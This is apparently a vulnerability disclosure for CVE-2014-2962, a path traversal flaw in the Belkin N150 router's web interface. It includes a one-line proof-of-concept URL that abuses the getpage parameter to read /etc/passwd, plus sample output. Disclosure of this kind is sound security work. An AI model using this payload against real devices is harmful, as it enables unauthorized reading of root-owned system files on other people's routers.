# Title: Path Traversal Vulnerability
# Product: Belkin Router N150
# Author: Rahul Pratap Singh
# Website: https://0x62626262.wordpress.com
# Contact:
   Linkedin: https://in.linkedin.com/in/rahulpratapsingh94
   Twitter: @0x62626262
# Vendor Homepage: http://www.belkin.com
# Firmware Tested: 1.00.08, 1.00.09
# CVE: 2014-2962

Description:
Belkin N150 wireless router firmware versions 1.00.07 and earlier contain a
path traversal vulnerability through the built-in web interface. The
webproc cgi
module accepts a getpage parameter which takes an unrestricted file path as
input. The web server runs with root privileges by default, allowing a
malicious attacker to read any file on the system.

A patch was released by Belkin but that is still vulnerable.

POC:
http://192.168.2.1/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo
#root:x:0:0:root:/root:/bin/bash root:x:0:0:root:/root:/bin/sh
#tw:x:504:504::/home/tw:/bin/bash #tw:x:504:504::/home/tw:/bin/msh

Ref:
https://www.kb.cert.org/vuls/id/774788
https://0x62626262.wordpress.com/category/full-disclosure/